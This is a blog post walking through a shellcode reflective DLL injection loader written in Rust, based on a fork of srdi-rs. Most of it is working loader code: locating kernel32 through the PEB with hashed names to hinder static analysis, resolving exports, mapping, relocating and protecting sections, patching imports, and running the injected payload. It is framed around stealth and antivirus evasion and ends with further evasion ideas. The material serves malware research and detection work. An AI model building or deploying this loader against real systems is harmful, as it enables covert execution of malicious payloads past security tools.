+++
title = 'Walkthrough of Shellcode Reflective DLL Injection (sRDI) with code examples'
date = 2023-12-09T20:42:26+02:00
author = ''
draft = false
tags = ['malware', 'injection', 'windows']
categories = []
+++

In the ever-evolving landscape of malware, Shellcode Reflective DLL Injection (RDI) stands as a formidable technique despite its age, distinguished by its stealth and efficiency. Unlike traditional DLL injection methods, which often leave apparent traces for AV systems to detect, RDI operates on a more subtle level. It challenges most of the basic AV solutions that only utilize behavior monitoring, heuristics, or signature-based detection. This post delves into the intricacies of implementing a reflective DLL loader based on a slightly modified fork of [memN0ps's srdi-rs](https://github.com/memN0ps/srdi-rs/). Although I'm considering converting the codebase to C in the future, I initially chose to explore the example in Rust due to my greater familiarity with it.

## Brief overview of the timeline

1. Execution is passed to the loader from a separate injector, that injects the shellcode containing both loader and payload into the target process's memory space (e.g. with `VirtualAlloc`).
2. The reflective loader parses the process's `kernel32.dll` to calculate the addresses of the functions required for relocation and execution.
3. The loader allocates a continuous region of memory to load its own image into.
4. The loader relocates itself into the allocated memory region with the help of its headers.
5. The loader resolves the imports and patches them into the relocated image's Import Address Table according to the previously gotten function addresses.
6. The loader applies appropriate protections on each relocated section.
7. The loader calls the relocated image's entry point `DllMain` with `DLL_PROCESS_ATTACH`.

## Implementation

The following two functions are implemented to make calculating Relative Virtual Addresses (RVAs) a bit easier:

```rust
pub fn rva<T>(base: *mut u8, offset: usize) -> *const T {
    (base as usize + offset) as *const T
}
```

```rust
pub fn rva_mut<T>(base: *mut u8, offset: usize) -> *mut T {
    (base as usize + offset) as *mut T
}
```

### Loading modules

The reflective DLL loading process begins by locating the modules and their exports needed to perform the subsequent stages of the injection. A prime target is `kernel32.dll`, a core module in Windows. Each Windows thread possesses a Thread Environment Block (TEB), which, among other thread specific data, points to a Process Environment Block (PEB). The PEB contains a `PEB_LDR_DATA` structure, cataloging user-mode modules loaded in the process. Crucially, it also features a `InLoadOrderModuleList` field, that points to a doubly linked list enumerating these modules by their load order. By iterating through this list, we can locate the module we're looking for. This step is pivotal in the process, as it allows us to access necessary functions from `kernel32.dll` without standard API calls, maintaining the stealthiness.

To illustrate, let's examine a code snippet that locates the PEB and traverses the `InLoadOrderModuleList`. Notably we also hash the strings containing the names of the modules to make static analysis a bit harder.

```rust
#[link_section = ".text"]
pub unsafe fn get_module_addr(module_hash: u32) -> Option<*mut u8> {
    // Get PEB, PEB_LDR_DATA and the first entry in the InMemoryOrderModuleList
    // Use the InLoadOrderModuleList so that we don't have to use the CONTAINING_RECORD macro to get the base address
    let peb_addr = get_peb();
    let peb_ldr_ptr = (*peb_addr).Ldr as *mut PEB_LDR_DATA;
    let mut data_table = (*peb_ldr_ptr).InLoadOrderModuleList.Flink as *mut LDR_DATA_TABLE_ENTRY;

    while !(*data_table).DllBase.is_null() {
        // Read the base DLL name from the LDR_DATA_TABLE_ENTRY
        let name_buf_ptr = (*data_table).BaseDllName.Buffer;
        let name_len = (*data_table).BaseDllName.Length as usize;
        let name_slice_buf = from_raw_parts(transmute::<PWSTR, *const u8>(name_buf_ptr), name_len);

        // Calculate the module hash and compare it
        if module_hash == hash_calc(name_slice_buf) {
            return Some((*data_table).DllBase as _);
        }

        // Get the next loaded module entry (pointed to by Flink) in the InLoadOrderModuleList
        data_table = (*data_table).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY;
    }

    None
}

#[link_section = ".text"]
pub unsafe fn get_peb() -> *mut PEB {
    // Get a pointer to the TEB from the FS register
    let teb: *mut TEB;
    asm!("mov {teb}, gs:[0x30]", teb = out(reg) teb);

    // Return the PEB pointer from the TEB's ProcessEnvironmentBlock field
    (*teb).ProcessEnvironmentBlock as *mut PEB
}
```

### Loading exports

After locating the base address of `kernel32.dll`, our next step is to identify the addresses of the specific functions we need. This requires an understanding of the Windows Portable Executable (PE) file format. A PE file is structured into various components, including the DOS Header, DOS Stub, NT Headers, and a Section Table, which houses the actual file contents in segments like `.text` and `.data`. Our focus is on the Export Directory located within the NT Headers, a crucial section that lists exported functions and their addresses. We can access the Export Directory by utilizing the `IMAGE_DIRECTORY_ENTRY_EXPORT` offset within the `IMAGE_DATA_DIRECTORY`. Similar to how we navigated through modules, we now iterate through the Export Directory entries to locate our required functions. This way we're able to bypass the usual API call mechanisms that could trigger security alerts.

<a href="https://0xrick.github.io/win-internals/pe2/" target="_blank" style="text-decoration: none;">
    <p align="center">
        <img src="/images/understanding-srdi/pe-file-structure.png" alt="Image of the PE file structure" width="400"/>
    </p>
</a>

```rust
#[link_section = ".text"]
pub unsafe fn get_export_addr(module_base: *mut u8, fn_hash: u32) -> Option<usize> {
    // Read the RVA of the Export Directory Table from the NT header and get the exported function names, ordinals, and addresses
    let nt_headers = get_nt_headers(module_base).unwrap();
    let export_dir = (module_base as usize
        + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT.0 as usize]
            .VirtualAddress as usize) as *mut IMAGE_EXPORT_DIRECTORY;

    let names = from_raw_parts(
        (module_base as usize + (*export_dir).AddressOfNames as usize) as *const u32,
        (*export_dir).NumberOfNames as _,
    );
    let funcs = from_raw_parts(
        (module_base as usize + (*export_dir).AddressOfFunctions as usize) as *const u32,
        (*export_dir).NumberOfFunctions as _,
    );
    let ords = from_raw_parts(
        (module_base as usize + (*export_dir).AddressOfNameOrdinals as usize) as *const u16,
        (*export_dir).NumberOfNames as _,
    );

    // Iterate over the exported function names and compare the hashes
    for i in 0..(*export_dir).NumberOfNames {
        let name_addr = (module_base as usize + names[i as usize] as usize) as *const i8;
        let name_len = get_cstr_len(name_addr as _);
        let name_slice = from_raw_parts(name_addr as _, name_len);

        if fn_hash == hash_calc(name_slice) {
            return Some(module_base as usize + funcs[ords[i as usize] as usize] as usize);
        }
    }

    None
}

#[link_section = ".text"]
pub unsafe fn get_nt_headers(module_base: *mut u8) -> Option<*mut IMAGE_NT_HEADERS64> {
    let dos_header = module_base as *mut IMAGE_DOS_HEADER;

    if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
        return None;
    }

    let nt_headers =
        (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;

    if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
        return None;
    }

    Some(nt_headers)
}
```

### Allocating memory

Having successfully 'imported' the necessary functions, we proceed to allocate memory for our payload shellcode within the target process. This is done using `VirtualAlloc`, with the allocated memory granted Read-Write (RW) permissions. Such permissions are essential for the subsequent stages where the payload will be written and executed. The payload’s NT Headers include an `ImageBase` field, indicating the preferred loading address. Initially, we can attempt to allocate memory at this address. If unsuccessful, we pass `NULL` as the `lpAddress` parameter to `VirtualAlloc`, allowing the system to choose an appropriate location. The specific memory address ultimately isn't critical, as the loader will handle any necessary relocations later in the execution process. This step is a good example of the adaptability of RDI, ensuring the loader can effectively position and execute the payload regardless of the initial allocation address.

```rust
// Get the NT headers from the PE header of the shellcode and read the size of the image
let dos_header = module_base as *mut IMAGE_DOS_HEADER;
let nt_headers =
    (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
let img_size = (*nt_headers).OptionalHeader.SizeOfImage as usize;

// Allocate memory with RW permissions for the image (attempt to allocate at the preferred base address)
let preferred_base = (*nt_headers).OptionalHeader.ImageBase as *mut c_void;
let mut base_addr = VirtualAlloc(
    preferred_base,
    img_size,
    MEM_RESERVE | MEM_COMMIT,
    PAGE_READWRITE,
);

// If the allocation to the preferred address failed, attempt to allocate at any address
if base_addr.is_null() {
    base_addr = VirtualAlloc(
        null_mut(),
        img_size,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE,
    );
}
```

### Copying sections

After the allocation, we can proceed to copying the payload sections and headers to the new memory section based on the `NumberOfSections` field of the payload's `IMAGE_FILE_HEADER`.

```rust
// Obtain a pointer to the first IMAGE_SECTION_HEADER in the PE file
let section_header = (&(*nt_headers).OptionalHeader as *const _ as usize
    + (*nt_headers).FileHeader.SizeOfOptionalHeader as usize)
    as *mut IMAGE_SECTION_HEADER;

// Copy each section iteratively
for i in 0..(*nt_headers).FileHeader.NumberOfSections {
    let header_i = &*(section_header.add(i as usize));

    let dst = base_addr.cast::<u8>().add(header_i.VirtualAddress as usize);
    let src = (module_base as usize + header_i.PointerToRawData as usize) as *const u8;
    let size = header_i.SizeOfRawData as usize;

    let src_data = from_raw_parts(src, size);

    (0..size).for_each(|x| {
        let src = src_data[x];
        let dst = dst.add(x);
        *dst = src;
    });
}

// Copy headers
for i in 0..(*nt_headers).OptionalHeader.SizeOfHeaders {
    let dst = base_addr as *mut u8;
    let src = module_base as *const u8;

    *dst.add(i as usize) = *src.add(i as usize);
}
```

### Processing image relocations

Most likely the payload won't be loaded into the preferred memory location, thus we need to address the image relocations. The necessary relocation data resides in the payload's NT Headers, within the Data Directory, specifically at the `IMAGE_DIRECTORY_ENTRY_BASERELOC` index. This base relocation table comprises entries each with a `VirtualAddress` field. We apply the delta, which is the difference between the allocated memory location and the preferred memory location, to these addresses. Additionally, we must factor in the offset specified in each table item. This careful adjustment ensures that all absolute addresses within the payload are correctly recalibrated to reflect the actual memory locations.

```rust
// Calculate the offset of the eventual base address from the desired base address found in the PE header
let delta = base_addr as isize - (*nt_headers).OptionalHeader.ImageBase as isize;

// Get the base relocation table to adjust the relocation offsets accordingly
let data_dir = (*nt_headers).OptionalHeader.DataDirectory;
let mut relocation: *mut IMAGE_BASE_RELOCATION = rva_mut(
    base_addr as _,
    data_dir[IMAGE_DIRECTORY_ENTRY_BASERELOC.0 as usize].VirtualAddress as usize,
);

if relocation.is_null() {
    return;
}

// Calculate the upper bound to prevent accessing memory past the end of the relocation data
let relocation_end =
    relocation as usize + data_dir[IMAGE_DIRECTORY_ENTRY_BASERELOC.0 as usize].Size as usize;

while (*relocation).VirtualAddress != 0
    && ((*relocation).VirtualAddress as usize) <= relocation_end
    && (*relocation).SizeOfBlock != 0
{
    // Get the relocation address, the first entry in the relocation block and the number of entries in the block
    let addr = rva::<isize>(base_addr as _, (*relocation).VirtualAddress as usize) as isize;
    let item = rva::<u16>(relocation as _, size_of::<IMAGE_BASE_RELOCATION>());
    let count = ((*relocation).SizeOfBlock as usize - size_of::<IMAGE_BASE_RELOCATION>())
        / size_of::<u16>();

    // Process each relocation entry
    for i in 0..count {
        // Read the type from the high bits and the offset from the low bits
        let type_field = (item.add(i).read() >> 12) as u32;
        let offset = item.add(i).read() & 0xFFF;

        // Apply relocation based on the delta if it's a type that needs to be handled
        match type_field {
            IMAGE_REL_BASED_DIR64 | IMAGE_REL_BASED_HIGHLOW => {
                *((addr + offset as isize) as *mut isize) += delta;
            }
            _ => {}
        }
    }

    // Proceed to the next relocation block location
    relocation = rva_mut(relocation as _, (*relocation).SizeOfBlock as usize);
}
```

### Resolving the imports

Now, to ensure the payload functions correctly, we must resolve its external dependencies by processing the import table. In the DLL's Data Directory, we focus on the `IMAGE_DIRECTORY_ENTRY_IMPORT` index, where the import directory resides. This directory contains an array of `IMAGE_IMPORT_DESCRIPTOR` structures, each representing a DLL from which the module imports functions. These DLLs are loaded into the process's address space using `LoadLibraryA`.

```rust
// Get the Import Directory Table from the Data Directory
let mut import_dir: *mut IMAGE_IMPORT_DESCRIPTOR = rva_mut(
    base_addr as _,
    data_dir[IMAGE_DIRECTORY_ENTRY_IMPORT.0 as usize].VirtualAddress as usize,
);

if import_dir.is_null() {
    return;
}

// Patch the IAT with the addresses of the imported functions
while (*import_dir).Name != 0x0 {
    // Get the name of the module to import from
    let module_name = rva::<i8>(base_addr as _, (*import_dir).Name as usize);

    if module_name.is_null() {
        return;
    }

    // Convert the module's name to PCSTR and load the module
    let module_handle = LoadLibraryA(PCSTR::from_raw(module_name as _));

    if module_handle.is_invalid() {
        return;
    }

    // Continues in the next snippet...
}
```

Next, the code must resolve the addresses of the imported functions, essentially patching the Import Address Table (IAT). This involves utilizing the `OriginalFirstThunk`, the Relative Virtual Address (RVA) of the Import Lookup Table (ILT), which points to an array of `IMAGE_THUNK_DATA64` structures. These structures contain information about the imported functions, either as names or ordinal numbers. The `FirstThunk`, in contrast, represents the IAT's RVA, where resolved addresses are updated. Thunks here serve as vital intermediaries, ensuring the correct linking of function calls within the payload.

In processing these `IMAGE_THUNK_DATA64` structures, the code distinguishes between named and ordinal imports. For ordinal imports, the function address is retrieved via `GetProcAddress` using the ordinal number. For named imports, the function's name is obtained from `IMAGE_IMPORT_BY_NAME`, referenced in the `AddressOfData` field of `IMAGE_THUNK_DATA64`, and its address is resolved likewise. Once obtained, the function address is written back into the corresponding `FirstThunk` entry, effectively redirecting the payload's function calls to the appropriate addresses. This step ensures the payload is able to operate within the new host environment.

```rust
// Find the RVA of the IAT via either OriginalFirstThunk or FirstThunk
let mut original_thunk: *mut IMAGE_THUNK_DATA64 =
    if (base_addr as usize + (*import_dir).Anonymous.OriginalFirstThunk as usize) != 0 {
        rva_mut(
            base_addr as _,
            (*import_dir).Anonymous.OriginalFirstThunk as usize,
        )
    } else {
        rva_mut(base_addr as _, (*import_dir).FirstThunk as usize)
    };

let mut thunk: *mut IMAGE_THUNK_DATA64 =
    rva_mut(base_addr as _, (*import_dir).FirstThunk as usize);

// Iterate through the table to find function names or ordinals
while (*original_thunk).u1.Function != 0 {
    let snap_res = (*original_thunk).u1.Ordinal & IMAGE_ORDINAL_FLAG64 != 0;

    // Check if the import is by name or by ordinal
    if snap_res {
        // Mask out the high bits to get the ordinal value and patch the address of the function
        let fn_ord = ((*original_thunk).u1.Ordinal & 0xFFFF) as *const u8;
        (*thunk).u1.Function =
            GetProcAddress(module_handle, PCSTR::from_raw(fn_ord)).unwrap() as _;
    } else {
        // Get the function name from the thunk and patch the address of the function
        let thunk_data = (base_addr as usize + (*original_thunk).u1.AddressOfData as usize)
            as *mut IMAGE_IMPORT_BY_NAME;
        let fn_name = (*thunk_data).Name.as_ptr();
        (*thunk).u1.Function =
            GetProcAddress(module_handle, PCSTR::from_raw(fn_name)).unwrap() as _;
    }

    // Move to the next thunk once all the current import descriptor's thunks have been processed
    thunk = thunk.add(1);
    original_thunk = original_thunk.add(1);
}
```

### Protecting the relocated sections

To ensure the seamless integration and correct functioning of the payload within the target process, setting appropriate memory protections for each relocated section is essential. This process begins by accessing the Section Header (`IMAGE_SECTION_HEADER`) via the `OptionalHeader` in the NT Header. Once located, we iterate through the payload's sections, gathering essential details such as each section's reference, its RVA, and the size of the data. The necessary modifications to memory protections are determined based on the `Characteristics` field of each section, guiding us to apply the correct security attributes. These new protections are implemented using `VirtualProtect`, tailored to the specifics of each section. An important final step is invoking `FlushInstructionCache`, a crucial action to ensure that any changes made to memory are recognized by the CPU. The key functionality of this step is to ensure the integrity and the stability of the payload.

```rust
// Get the RVA of the first IMAGE_SECTION_HEADER in the PE file
let section_header = rva_mut::<IMAGE_SECTION_HEADER>(
    &(*nt_headers).OptionalHeader as *const _ as _,
    (*nt_headers).FileHeader.SizeOfOptionalHeader as usize,
);

// Iterate through the sections and update their permissions
for i in 0..(*nt_headers).FileHeader.NumberOfSections {
    // Initialize variables for current and old protection flags
    let mut protection = PAGE_PROTECTION_FLAGS(0);
    let mut old_protection = PAGE_PROTECTION_FLAGS(0);

    // Calculate the destination address of the current section based on the RVA of the section and the new base address of the module
    let header_i = &*(section_header).add(i as usize);
    let dst = base_addr.cast::<u8>().add(header_i.VirtualAddress as usize);

    // Retrieve the size of the section's raw data
    let size = header_i.SizeOfRawData as usize;

    // Check the characteristics of the current section to determine the correct memory protection constant to apply

    if header_i.Characteristics & IMAGE_SCN_MEM_WRITE != IMAGE_SECTION_CHARACTERISTICS(0) {
        protection = PAGE_WRITECOPY;
    }

    if header_i.Characteristics & IMAGE_SCN_MEM_READ != IMAGE_SECTION_CHARACTERISTICS(0) {
        protection = PAGE_READONLY;
    }

    if header_i.Characteristics & IMAGE_SCN_MEM_WRITE != IMAGE_SECTION_CHARACTERISTICS(0)
        && header_i.Characteristics & IMAGE_SCN_MEM_READ != IMAGE_SECTION_CHARACTERISTICS(0)
    {
        protection = PAGE_READWRITE;
    }

    if header_i.Characteristics & IMAGE_SCN_MEM_EXECUTE != IMAGE_SECTION_CHARACTERISTICS(0) {
        protection = PAGE_EXECUTE;
    }

    if header_i.Characteristics & IMAGE_SCN_MEM_EXECUTE != IMAGE_SECTION_CHARACTERISTICS(0)
        && header_i.Characteristics & IMAGE_SCN_MEM_WRITE != IMAGE_SECTION_CHARACTERISTICS(0)
    {
        protection = PAGE_EXECUTE_WRITECOPY;
    }

    if header_i.Characteristics & IMAGE_SCN_MEM_EXECUTE != IMAGE_SECTION_CHARACTERISTICS(0)
        && header_i.Characteristics & IMAGE_SCN_MEM_READ != IMAGE_SECTION_CHARACTERISTICS(0)
    {
        protection = PAGE_EXECUTE_READ;
    }

    if header_i.Characteristics & IMAGE_SCN_MEM_EXECUTE != IMAGE_SECTION_CHARACTERISTICS(0)
        && header_i.Characteristics & IMAGE_SCN_MEM_WRITE != IMAGE_SECTION_CHARACTERISTICS(0)
        && header_i.Characteristics & IMAGE_SCN_MEM_READ != IMAGE_SECTION_CHARACTERISTICS(0)
    {
        protection = PAGE_EXECUTE_READWRITE;
    }

    // Apply the new protection to the current section
    VirtualProtect(dst as _, size, protection, &mut old_protection);
}

// Flush the instruction cache to ensure the CPU sees the changes made to the memory
FlushInstructionCache(HANDLE(-1), null_mut(), 0);
```

### Executing the payload

Finally, with the payload meticulously mapped into the memory, we are set to execute it. The execution path hinges on the value of the flags parameter. If the parameter indicates so, we can either run user-defined functions within the payload or execute the payload's entry point. To calculate the entry point, we add the `AddressOfEntryPoint`, obtained from the `OptionalHeader` in the NT Header, to the starting address of the allocated memory section. This pinpoints the exact location where the execution should begin. For user-defined functions, the process is a bit more intricate, requiring iterative searching [similar to how we initially located functions within `kernel32.dll`](#loading-modules). This final step of execution is the culmination of the reflective DLL injection process, seamlessly initiating the payload's functionality within the target process while preserving the stealthiness that characterizes this technique.

```rust
let entry = base_addr as usize + (*nt_headers).OptionalHeader.AddressOfEntryPoint as usize;

// Create and assign callable Rust type for the entry function
#[allow(non_camel_case_types)]
type DllMain =
    unsafe extern "system" fn(module: HMODULE, call_reason: u32, reserved: *mut c_void) -> BOOL;

#[allow(non_snake_case)]
let DllMain = transmute::<_, DllMain>(entry);

if flags == 0 {
    // Execute the entry point with the module base address, DLL_PROCESS_ATTACH flag, and a pointer to the payload
    DllMain(
        HMODULE(base_addr as _),
        DLL_PROCESS_ATTACH,
        module_base as _,
    );
} else {
    // Create and assign callable Rust type for the user defined function
    #[allow(non_camel_case_types)]
    type UserFunction =
        unsafe extern "system" fn(user_data: *mut c_void, user_data_len: u32) -> BOOL;

    // Calculate the address of the user function by adding the address of the base of the module to the RVA of the user function
    let user_fn_addr = get_export_addr(base_addr as _, fn_hash).unwrap();

    #[allow(non_snake_case)]
    let UserFunction = transmute::<_, UserFunction>(user_fn_addr);

    // Execute the user function with the user data
    UserFunction(user_data, user_data_len);
}
```

## Additional evasion techniques

Now that we've covered the basics, let's delve into detection evasion strategies. For those interested in AV bypass techniques, a highly recommended resource is [BypassAV by matro7sh](https://github.com/matro7sh/BypassAV). I plan to integrate some of the techniques from this source into my [fork](https://github.com/17ms/jarritos) and will update this section accordingly when I have the time to do so. Some of the potential enhancements might include:

- **Loader**: Implementing randomized imports for added unpredictability.
- **Shellcode Generator**: Introducing encryption and obfuscation post-conversion.
- **Injector**: Employing a CDN connector with chunked downloads and incorporating shellcode decryption and deobfuscation methods.

<a href="https://github.com/matro7sh/BypassAV" target="_blank" style="text-decoration: none;">
    <p align="center">
        <img src="/images/understanding-srdi/bypass-av.png" alt="Map of essentail AV/EDR bypass methods"/>
    </p>
</a>

## References

- ["An Improved Reflective DLL Injection Technique" by Dan Staples](https://disman.tl/2015/01/30/an-improved-reflective-dll-injection-technique.html)
  - [The implementation of the loader](https://github.com/dismantl/ImprovedReflectiveDLLInjection)
- [sRDI implementation in C by Nick Landers](https://github.com/monoxgas/sRDI/)
- [sRDI implementation in Rust by memN0ps](https://github.com/memN0ps/srdi-rs/)
- ["Reflective DLL Injection in C++" by Brendan Ortiz](https://depthsecurity.com/blog/reflective-dll-injection-in-c)
- [Thorough walkthrough of the PE file format by 0xRick](https://0xrick.github.io/categories/#win-internals)
- ["A tale of EDR bypass methods" by s3cur3th1ssh1t](https://s3cur3th1ssh1t.github.io/A-tale-of-EDR-bypass-methods/)
- [Essential AV/EDR bypass methods mapped out by matro7sh](https://matro7sh.github.io/BypassAV/)
- [MSDN Win32 API documentation](https://learn.microsoft.com/en-us/windows/win32/)
